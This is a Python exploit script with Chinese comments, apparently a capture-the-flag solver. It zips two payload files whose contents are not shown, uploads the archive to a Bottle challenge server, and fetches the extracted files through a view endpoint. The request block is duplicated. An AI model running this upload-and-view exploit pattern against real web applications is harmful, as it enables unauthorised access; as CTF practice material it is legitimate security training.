import requests
import zipfile
import os

# 创建ZIP文件
def create_zip():
    with zipfile.ZipFile('bottle_exploit.zip', 'w') as zipf:
        zipf.write('bottle5.txt', 'test1.txt')
        zipf.write('bottle6.txt', 'test2.txt')

# 发送请求
def send_exploit():
    url = 'http://challenge.xinshi.fun:48853/upload'
    
    # 创建ZIP文件
    create_zip()
    
    # 准备文件
    files = {
        'file': ('bottle_exploit.zip', open('bottle_exploit.zip', 'rb'), 'application/zip')
    }
    
    # 发送POST请求
    response = requests.post(url, files=files)
    print("Upload response:", response.text)
    
    # 从响应中提取MD5和文件名
    try:
        # 解析响应文本
        response_parts = response.text.split('访问: /view/')
        if len(response_parts) > 1:
            path_parts = response_parts[1].strip().split('/')
            if len(path_parts) >= 2:
                md5_hash = path_parts[0]
                filename = path_parts[1]
                
                # 访问查看页面
                # 尝试两个文件
                view_url1 = f'http://challenge.xinshi.fun:48853/view/{md5_hash}/test1.txt'
                view_url2 = f'http://challenge.xinshi.fun:48853/view/{md5_hash}/test2.txt'
                print(f"\nAccessing first URL: {view_url1}")
                response1 = requests.get(view_url1)
                print("Response 1:", response1.text)
                print(f"\nAccessing second URL: {view_url2}")
                response2 = requests.get(view_url2)
                print("Response 2:", response2.text)
                # 尝试两个文件
                view_url1 = f'http://challenge.xinshi.fun:48853/view/{md5_hash}/test1.txt'
                view_url2 = f'http://challenge.xinshi.fun:48853/view/{md5_hash}/test2.txt'
                print(f"\nAccessing first URL: {view_url1}")
                response1 = requests.get(view_url1)
                print("Response 1:", response1.text)
                print(f"\nAccessing second URL: {view_url2}")
                response2 = requests.get(view_url2)
                print("Response 2:", response2.text)
    except Exception as e:
        print(f"Error processing response: {e}")

    # 清理文件
    try:
        os.remove('bottle_exploit.zip')
    except:
        pass

if __name__ == '__main__':
    send_exploit()
